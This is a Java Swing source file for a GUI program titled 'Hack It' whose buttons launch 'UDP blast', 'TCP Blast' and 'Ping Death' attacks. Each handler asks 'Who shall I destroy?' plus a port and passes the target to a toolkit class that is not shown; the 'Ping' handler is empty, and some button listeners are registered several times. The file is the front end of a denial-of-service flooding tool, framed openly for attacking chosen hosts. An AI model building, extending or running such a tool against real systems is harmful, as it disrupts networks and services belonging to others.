package hackit;

import java.awt.*;
import java.awt.event.*;
import javax.swing.*;
import java.net.*;

public class Frame1 extends JFrame {
  private JPanel contentPane;
  private JMenuBar jMenuBar1 = new JMenuBar();
  private JMenu jMenuFile = new JMenu();
  private JMenuItem jMenuFileExit = new JMenuItem();
  private JMenu jMenuHelp = new JMenu();
  private JMenuItem jMenuHelpAbout = new JMenuItem();
  private JOptionPane jOption = new JOptionPane();
  private JButton jButton1 = new JButton();
  private JButton jButton2 = new JButton();
  private hackToolkit toolkit = new hackToolkit(this);
  private JButton jButton3 = new JButton();
  private JButton jButton4 = new JButton();

  //Construct the frame
  public Frame1() {
    enableEvents(AWTEvent.WINDOW_EVENT_MASK);
    try {
      jbInit();
    }
    catch(Exception e) {
      e.printStackTrace();
    }
  }
  //Component initialization
  private void jbInit() throws Exception  {
    contentPane = (JPanel) this.getContentPane();
    contentPane.setLayout(null);
    this.setSize(new Dimension(400, 300));
    this.setTitle("Hack It");
    jMenuFile.setText("File");
    jMenuFileExit.setText("Exit");
    jMenuFileExit.addActionListener(new Frame1_jMenuFileExit_ActionAdapter(this));
    jMenuHelp.setText("Help");
    jMenuHelpAbout.setText("About");
    jMenuHelpAbout.addActionListener(new Frame1_jMenuHelpAbout_ActionAdapter(this));
    jButton1.setBounds(new Rectangle(25, 222, 94, 21));
    jButton1.setText("UDP blast");
    jButton1.addActionListener(new Frame1_jButton1_actionAdapter(this));
    jButton2.addActionListener(new Frame1_jButton2_actionAdapter(this));
    jButton2.setText("Ping");
    jButton2.addActionListener(new Frame1_jButton2_actionAdapter(this));
    jButton2.setBounds(new Rectangle(25, 193, 94, 21));
    jButton3.setBounds(new Rectangle(25, 161, 94, 21));
    jButton3.addActionListener(new Frame1_jButton3_actionAdapter(this));
    jButton3.setText("TCP Blast");
    jButton3.addActionListener(new Frame1_jButton3_actionAdapter(this));
    jButton3.addActionListener(new Frame1_jButton3_actionAdapter(this));
    jButton4.addActionListener(new Frame1_jButton4_actionAdapter(this));
    jButton4.addActionListener(new Frame1_jButton4_actionAdapter(this));
    jButton4.setText("Ping Death");
    jButton4.addActionListener(new Frame1_jButton4_actionAdapter(this));
    jButton4.addActionListener(new Frame1_jButton4_actionAdapter(this));
    jButton4.setBounds(new Rectangle(25, 129, 94, 21));
    jMenuFile.add(jMenuFileExit);
    jMenuHelp.add(jMenuHelpAbout);
    jMenuBar1.add(jMenuFile);
    jMenuBar1.add(jMenuHelp);
    contentPane.add(jButton1, null);
    contentPane.add(jButton2, null);
    contentPane.add(jButton3, null);
    contentPane.add(jButton4, null);
    this.setJMenuBar(jMenuBar1);
  }
  //File | Exit action performed
  public void jMenuFileExit_actionPerformed(ActionEvent e) {
    System.exit(0);
  }
  //Help | About action performed
  public void jMenuHelpAbout_actionPerformed(ActionEvent e) {
    Frame1_AboutBox dlg = new Frame1_AboutBox(this);
    Dimension dlgSize = dlg.getPreferredSize();
    Dimension frmSize = getSize();
    Point loc = getLocation();
    dlg.setLocation((frmSize.width - dlgSize.width) / 2 + loc.x, (frmSize.height - dlgSize.height) / 2 + loc.y);
    dlg.setModal(true);
    dlg.pack();
    dlg.show();
  }
  //Overridden so we can exit when window is closed
  protected void processWindowEvent(WindowEvent e) {
    super.processWindowEvent(e);
    if (e.getID() == WindowEvent.WINDOW_CLOSING) {
      jMenuFileExit_actionPerformed(null);
    }
  }
  public void showError(String msg){
    JOptionPane.showMessageDialog(jOption,msg,"Error",JOptionPane.ERROR_MESSAGE);
  }

  public void jButton1_actionPerformed(ActionEvent e) {
    //sets up a UDP attack
    String target = JOptionPane.showInputDialog(jOption,"Who shall I destroy? ");
    int targetPort = Integer.parseInt(JOptionPane.showInputDialog(jOption,"Which port? "));
    try {
      toolkit.setRemoteComputer(InetAddress.getByName(target), targetPort);
      toolkit.udpBlast();
    }catch (UnknownHostException ex) {showError("UnknownHostException in Frame1 jButton1: " + ex);}
  }
  public void jButton2_actionPerformed(ActionEvent e) {
    //performs a normal nice ping

  }

  public void jButton3_actionPerformed(ActionEvent e) {
    //performs a TCP attack
    String target = JOptionPane.showInputDialog(jOption,"Who shall I destroy? ");
    int targetPort = Integer.parseInt(JOptionPane.showInputDialog(jOption,"Which port? "));
    try {
      toolkit.setRemoteComputer(InetAddress.getByName(target), targetPort);
      toolkit.tcpBlast();
    }catch (UnknownHostException ex) {showError("UnknownHostException in Frame1 jButton1: " + ex);}
  }

  public void jButton4_actionPerformed(ActionEvent e) {
    //performs a ping of death attack
    String target = JOptionPane.showInputDialog(jOption,"Who shall I destroy? ");
    int targetPort = Integer.parseInt(JOptionPane.showInputDialog(jOption,"Which port? "));
    try {
      toolkit.setRemoteComputer(InetAddress.getByName(target), targetPort);
      toolkit.pingDeath();
    }catch (UnknownHostException ex) {showError("UnknownHostException in Frame1 jButton1: " + ex);}


  }
}

class Frame1_jMenuFileExit_ActionAdapter implements ActionListener {
  Frame1 adaptee;

  Frame1_jMenuFileExit_ActionAdapter(Frame1 adaptee) {
    this.adaptee = adaptee;
  }
  public void actionPerformed(ActionEvent e) {
    adaptee.jMenuFileExit_actionPerformed(e);
  }
}

class Frame1_jMenuHelpAbout_ActionAdapter implements ActionListener {
  Frame1 adaptee;

  Frame1_jMenuHelpAbout_ActionAdapter(Frame1 adaptee) {
    this.adaptee = adaptee;
  }
  public void actionPerformed(ActionEvent e) {
    adaptee.jMenuHelpAbout_actionPerformed(e);
  }
}

class Frame1_jButton1_actionAdapter implements java.awt.event.ActionListener {
  Frame1 adaptee;

  Frame1_jButton1_actionAdapter(Frame1 adaptee) {
    this.adaptee = adaptee;
  }
  public void actionPerformed(ActionEvent e) {
    adaptee.jButton1_actionPerformed(e);
  }
}

class Frame1_jButton2_actionAdapter implements java.awt.event.ActionListener {
  Frame1 adaptee;

  Frame1_jButton2_actionAdapter(Frame1 adaptee) {
    this.adaptee = adaptee;
  }
  public void actionPerformed(ActionEvent e) {
    adaptee.jButton2_actionPerformed(e);
  }
}

class Frame1_jButton3_actionAdapter implements java.awt.event.ActionListener {
  Frame1 adaptee;

  Frame1_jButton3_actionAdapter(Frame1 adaptee) {
    this.adaptee = adaptee;
  }
  public void actionPerformed(ActionEvent e) {
    adaptee.jButton3_actionPerformed(e);
  }
}

class Frame1_jButton4_actionAdapter implements java.awt.event.ActionListener {
  Frame1 adaptee;

  Frame1_jButton4_actionAdapter(Frame1 adaptee) {
    this.adaptee = adaptee;
  }
  public void actionPerformed(ActionEvent e) {
    adaptee.jButton4_actionPerformed(e);
  }
}